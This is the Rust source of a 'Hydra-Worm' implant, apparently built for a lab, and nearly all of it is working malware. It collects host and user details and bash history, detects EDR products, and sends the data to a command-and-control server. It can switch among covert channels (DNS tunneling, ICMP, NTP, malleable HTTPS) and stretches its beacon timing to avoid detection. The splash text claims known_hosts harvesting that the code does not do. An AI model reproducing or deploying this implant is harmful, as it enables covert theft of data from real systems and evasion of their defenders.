// Project: Hydra-Worm Agent
use std::net::ToSocketAddrs; // Required for runtime hostname resolution
use std::{thread, time::Duration, net::UdpSocket};
use rand::Rng;
use rand::seq::SliceRandom;
use rand_distr::{Distribution, Exp};
use serde::{Serialize, Deserialize};
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
use base64::{Engine as _, engine::general_purpose};
// Added for system recon
// Cleaned up imports (Removed unused pnet::packet::Packet and pnet::util)
use sysinfo::System; // 
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpTypes; 
use pnet::packet::Packet;

#[derive(Serialize, Clone)]
struct Telemetry {
    #[serde(rename = "a")] agent_id: String, 
    #[serde(rename = "t")] transport: String,
    #[serde(rename = "s")] status: String,
    #[serde(rename = "l")] lambda: f64,
    #[serde(rename = "h")] hostname: String,
    #[serde(rename = "u")] username: String,
    #[serde(rename = "o")] os: String,
    #[serde(rename = "e")] env_context: String,
    #[serde(rename = "p")] artifact_preview: String,
    #[serde(rename = "d")] defense_profile: String,
}

#[derive(Deserialize)]
struct C2Response {
    #[allow(dead_code)]
    status: String,
    task: String,
    epoch: i64,
}

fn profile_defenses() -> String {
    let edr_signatures = [
        ("/opt/CrowdStrike/falcond", "CrowdStrike"),
        ("/var/lib/s1", "SentinelOne"),
        ("/opt/carbonblack", "CarbonBlack"),
        ("/etc/microsoft/mdatp", "Defender"),
    ];

    for (path, name) in edr_signatures.iter() {
        if std::path::Path::new(path).exists() {
            return name.to_string();
        }
    }
    "None".into()
}

fn harvest_bash_history(username: &str) -> String {
    let path = if username == "root" {
        "/root/.bash_history".to_string()
    } else {
        format!("/home/{}/.bash_history", username)
    };

    match std::fs::read_to_string(&path) {
        Ok(content) => {
            // Take the last 2 lines for high-stealth/low-bandwidth
            let lines: Vec<&str> = content.lines().rev().take(2).collect();
            if lines.is_empty() { 
                "Empty".into() 
            } else { 
                lines.join(" | ").replace("\"", "'") 
            }
        }
        Err(_) => "Access Denied".into(),
    }
}

trait Transport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String>;
    fn get_name(&self) -> String;
}

// --- TRANSPORT TIER 6: DNS TUNNELING (FIXED FOR DIRECT UDP) ---

// --- TRANSPORT TIER 6: DNS TUNNELING (FIXED) ---

struct DnsTransport { 
    root_domain: String,
    target_addr: String, // Dynamic target
}

// --- TRANSPORT TIER 6: DNS TUNNELING (RFC 1035 HARDENED) ---
impl Transport for DnsTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        // 1. TACTICAL TRIMMING: DNS names cannot exceed 255 total bytes.
        // We must truncate the bash history to fit.
        let mut stats_min = stats.clone();
        if stats_min.artifact_preview.len() > 32 {
            stats_min.artifact_preview = format!("{}...", &stats_min.artifact_preview[..29]);
        }

        let json_data = serde_json::to_string(&stats_min).map_err(|e| e.to_string())?;
        
        // 2. URL-Safe Encoding (matches Go side)
        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
        
        let mut packet = Vec::new();
        // DNS Header: Transaction ID (0x1337), Flags (Standard Query), 1 Question
        packet.extend_from_slice(&[0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); 

        // 3. ENCODE PAYLOAD LABELS: Length-prefix every 60 bytes
        for chunk in encoded.as_bytes().chunks(60) {
            packet.push(chunk.len() as u8);
            packet.extend_from_slice(chunk);
        }

        // 4. ENCODE ROOT DOMAIN: "c2.hydra-worm.local"
        // We split by '.' to ensure each part is treated as a distinct DNS label
        for part in self.root_domain.split('.') {
            if part.is_empty() { continue; }
            packet.push(part.len() as u8);
            packet.extend_from_slice(part.as_bytes());
        }
        
        // Null terminator (End of Name) + Type A + Class IN
        packet.push(0); 
        packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]);

        // 5. DISPATCH & AWAIT ACK
        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
        socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
        
        socket.send_to(&packet, &self.target_addr).map_err(|e| e.to_string())?;

        let mut buf = [0u8; 512];
        match socket.recv_from(&mut buf) {
            Ok(_) => Ok(C2Response { status: "dns_ack".into(), task: "SLEEP".into(), epoch: 0 }),
            Err(_) => Err("DNS Timeout - No C2 ACK".into()),
        }
    }

    fn get_name(&self) -> String { "DNS-Tunnel".into() }
}

// --- TRANSPORT TIER 5: NTP SIGNALING ---

struct NtpTransport { 
    pool_addr: String 
}

impl Transport for NtpTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
        socket.set_read_timeout(Some(Duration::from_secs(3))).map_err(|e| e.to_string())?;
        
        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
        
        let mut ntp_packet = vec![0u8; 48];
        ntp_packet[0] = 0x1b; // LI=0, VN=3, Mode=3 (Client)
        ntp_packet.extend_from_slice(encoded.as_bytes());

        socket.send_to(&ntp_packet, &self.pool_addr).map_err(|e| e.to_string())?;

        let mut buf = [0u8; 1024];
        let (amt, _) = socket.recv_from(&mut buf).map_err(|e| e.to_string())?;
        
        // C2 must respond with "T-ACK" after the 48th byte
        if amt >= 48 && &buf[48..53] == b"T-ACK" {
            Ok(C2Response { status: "ntp_synced".into(), task: "WAIT".into(), epoch: 0 })
        } else {
            Err("NTP_SIG_FAIL".into())
        }
    }

    fn get_name(&self) -> String { "NTP-Signaling".into() } // <--- COMPLIANCE FIX
}

// --- TRANSPORT TIER 4: ICMP FAILSAFE ---

struct IcmpTransport { 
    target_ip: std::net::Ipv4Addr 
}

impl Transport for IcmpTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
        
        // 1. Build & Send (Short & Fast)
        let mut buffer = vec![0u8; 8 + encoded.len()];
        let mut packet = MutableEchoRequestPacket::new(&mut buffer).unwrap();
        packet.set_icmp_type(IcmpTypes::EchoRequest);
        packet.set_payload(encoded.as_bytes());
        
        let (mut tx, mut rx) = pnet::transport::transport_channel(
            4096,
            pnet::transport::TransportChannelType::Layer4(pnet::transport::TransportProtocol::Ipv4(pnet::packet::ip::IpNextHeaderProtocols::Icmp))
        ).map_err(|e| e.to_string())?;

        tx.send_to(packet, std::net::IpAddr::V4(self.target_ip)).map_err(|e| e.to_string())?;

        // 2. Strict Receiver with Resurrection Check
        let mut rx_iter = pnet::transport::icmp_packet_iter(&mut rx);
        
        // Increased timeout to 2s for "hibernating" stability
        match rx_iter.next_with_timeout(Duration::from_millis(2000)) {
            Ok(Some((packet, addr))) if addr == std::net::IpAddr::V4(self.target_ip) => {
                let rx_payload = packet.payload();
                
                // RESURRECTION CHECK: Look for the specific 'WAKE' signature
                if rx_payload.len() >= 14 && &rx_payload[4..14] == b"HYDRA_WAKE" {
                    println!("[!] ZOMBIE SIGNAL: Resurrection command received. Re-engaging primary systems.");
                    return Ok(C2Response { status: "resurrected".into(), task: "RESUME".into(), epoch: 1 });
                }

                // STANDARD ACK: Stay in Zombie Loop (Tier 4)
                if rx_payload.len() >= 13 && &rx_payload[4..13] == b"HYDRA_ACK" {
                    return Ok(C2Response { status: "icmp_ack_verified".into(), task: "SLEEP".into(), epoch: 0 });
                }
                
                println!("[-] Signature mismatch! Likely Kernel Ping.");
                Err("SIG_FAIL".into())
            },
            _ => {
                println!("[-] No valid C2 response detected.");
                Err("OFFLINE".into())
            }
        }
    }

    fn get_name(&self) -> String { "ICMP-Failsafe".into() }
}

// --- TRANSPORT TIER 2: MALLEABLE HTTPS ---

struct MalleableHttps { 
    c2_url: String 
}

impl Transport for MalleableHttps {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let profile = MalleableProfile::new();
        let client = reqwest::blocking::Client::builder()
            .use_rustls_tls()
            .timeout(Duration::from_secs(5))
            .build()
            .map_err(|e: reqwest::Error| e.to_string())?;

        let response = client.post(&self.c2_url)
            .headers(profile.headers.clone())
            .header(USER_AGENT, &profile.user_agent)
            .header("X-Hydra-Key", &profile.hydra_key)
            .json(stats)
            .send()
            .map_err(|e: reqwest::Error| format!("Network Error: {}", e))?;

        if response.status().is_success() {
            let body: C2Response = response.json().map_err(|e: reqwest::Error| e.to_string())?;
            println!("[+] Malleable Success | Profile: [UA: {}] [Key: {}]", profile.user_agent, profile.hydra_key);
            Ok(body)
        } else {
            Err(format!("HTTP Error: {}", response.status()))
        }
    }
    fn get_name(&self) -> String { "Malleable-HTTPS".into() }
}

struct MalleableProfile {
    user_agent: String,
    hydra_key: String,
    headers: HeaderMap,
}

impl MalleableProfile {
    fn new() -> Self {
        let mut rng = rand::thread_rng();
        let uas = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ];
        let mut headers = HeaderMap::new();
        headers.insert(reqwest::header::ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
        let key: String = (0..8).map(|_| rng.gen_range(b'A'..=b'Z') as char).collect();
        Self {
            user_agent: uas.choose(&mut rng).unwrap().to_string(),
            hydra_key: key,
            headers,
        }
    }
}

struct CloudTransport { endpoint: String }
impl Transport for CloudTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let client = reqwest::blocking::Client::new();
        // Target internal lab for mock testing
        let res = client.post(&self.endpoint)
            .header("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9") 
            .json(stats)
            .send()
            .map_err(|e| e.to_string())?;

        if res.status().is_success() {
            Ok(res.json().map_err(|e| e.to_string())?)
        } else {
            Err(format!("Cloud API Error: {}", res.status()))
        }
    }

    fn get_name(&self) -> String { "Azure-Graph-Mock".into() } // <--- COMPLIANCE FIX
}

struct P2PTransport;
impl Transport for P2PTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
        println!("[!] C2-P2P: Broadcasting to local mesh...");
        Err("Tier 3 - Mesh discovery active".into())
    }
    fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
}

struct Agent {
    id: String,
    transport: Box<dyn Transport>,
    failures: u32,
    state: u8,
    lambda: f64,
}

fn detect_env() -> String {
    // Check for Docker
    if std::path::Path::new("/.dockerenv").exists() {
        return "Docker-Container".into();
    }

    // Check for Cloud IMDS (AWS/GCP/OpenStack)
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_millis(300)) // Fast timeout to avoid lag
        .build()
        .unwrap_or_default();

    match client.get("http://169.254.169.254/latest/meta-data/instance-id").send() {
        Ok(_) => "Cloud-Instance".into(),
        Err(_) => "Bare-Metal/VM".into(),
    }
}

impl Agent {
    fn new(id: &str) -> Self {
        let c2_hostname = "hydra-c2-lab"; 
        Self {
            id: id.to_string(),
            // START AT TIER 1 (Cloud)
            transport: Box::new(CloudTransport { 
                endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
            }),
            failures: 0,
            state: 0, // Reset to 0 so it starts with Cloud API
            lambda: 0.2, 
        }
    }


    fn run(&mut self) {
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let hostname = System::host_name().unwrap_or_else(|| "unknown_host".into());
        let user_list = sysinfo::Users::new_with_refreshed_list();
        let current_pid = sysinfo::get_current_pid().unwrap();
        
        let username = sys.process(current_pid)
            .and_then(|p| {
                let uid = p.user_id()?;
                user_list.iter().find(|u| u.id() == uid)
            })
            .map(|u| u.name().to_string())
            .unwrap_or_else(|| "unknown_user".into());
            
        let os_info = format!("{} {}", System::name().unwrap_or_default(), System::os_version().unwrap_or_default());
        let env_ctx = detect_env();

        loop {
            // Phase 2.1 & 2.3: Harvest artifacts and Profile defenses
            let history_snippet = harvest_bash_history(&username);
            let defense_ctx = profile_defenses(); 

            let stats = Telemetry {
                agent_id: self.id.clone(),
                transport: self.transport.get_name(),
                status: "OK".into(),
                lambda: self.lambda,
                hostname: hostname.clone(),
                username: username.clone(),
                os: os_info.clone(),
                env_context: env_ctx.clone(),
                artifact_preview: history_snippet,
                defense_profile: defense_ctx, 
            };

            match self.transport.send_heartbeat(&stats) {
                Ok(res) => {
                    println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
                    self.failures = 0;
                },
                Err(e) => {
                    println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                    self.failures += 1;

                    // TACTICAL BREAKOUT: Immediate mutation for ICMP or 3+ failures
                    if self.transport.get_name() == "ICMP-Failsafe" || self.failures >= 3 {
                        self.mutate();
                        // Bypass jitter sleep and try the new transport immediately
                        continue; 
                    }
                }
            }

            if self.failures >= 3 { self.mutate(); }
            
            // --- PHASE 2.4: ADAPTIVE JITTER & TEMPORAL EVASION ---
            let mut rng = rand::thread_rng();
            let mut current_lambda = self.lambda;

            // TACTICAL ADJUSTMENT: If EDR is present, throttle the heartbeat.
            // Lower Lambda = higher inter-arrival time (IAT).
            if stats.defense_profile != "None" {
                current_lambda /= 2.0; 
                println!("[!] EDR Detected: Throttling traffic to avoid heuristic detection.");
            }

            let exp = Exp::new(current_lambda).unwrap();
            
            // Adaptive Clamping: Allow longer sleeps (up to 5 mins) when under surveillance
            let max_sleep = if stats.defense_profile != "None" { 300.0 } else { 60.0 };
            let sleep_time = exp.sample(&mut rng).min(max_sleep).max(1.0);
            
            thread::sleep(Duration::from_secs_f64(sleep_time));
        }
    }

    fn mutate(&mut self) {
        self.state = (self.state + 1) % 6;
        self.failures = 0;
        
        let c2_hostname = "hydra-c2-lab"; 
        
        // Dynamic IP resolution for Layer 4
        let c2_ip = format!("{}:80", c2_hostname)
            .to_socket_addrs()
            .map(|mut addrs| addrs.next().map(|s| s.ip()))
            .unwrap_or(None)
            .and_then(|ip| match ip {
                std::net::IpAddr::V4(v4) => Some(v4),
                _ => None,
            })
            .unwrap_or_else(|| "10.5.0.5".parse().unwrap()); // Fallback

        println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);

        self.transport = match self.state {
            // TIER 1: Fixed for internal lab API
            0 => Box::new(CloudTransport { 
                endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
            }),
            1 => Box::new(MalleableHttps { 
                c2_url: format!("http://{}:8080/api/v1/heartbeat", c2_hostname) 
            }),
            2 => Box::new(P2PTransport),
            3 => Box::new(IcmpTransport { target_ip: c2_ip }),
            4 => Box::new(NtpTransport { pool_addr: format!("{}:123", c2_hostname) }),
            _ => Box::new(DnsTransport { 
                root_domain: "c2.hydra-worm.local".into(),
                target_addr: format!("{}:53", c2_hostname) 
            }),
        };
    }
}

fn display_splash() {
    println!(r#"
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ `/   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    "#);
    println!("      [ Phase 2.2 Artifact Harvesting: Parsing known_hosts and bash_history.]\n");
}

fn main() {
    display_splash();
    let mut agent = Agent::new("HYDRA-AGENT-01");
    agent.run();
}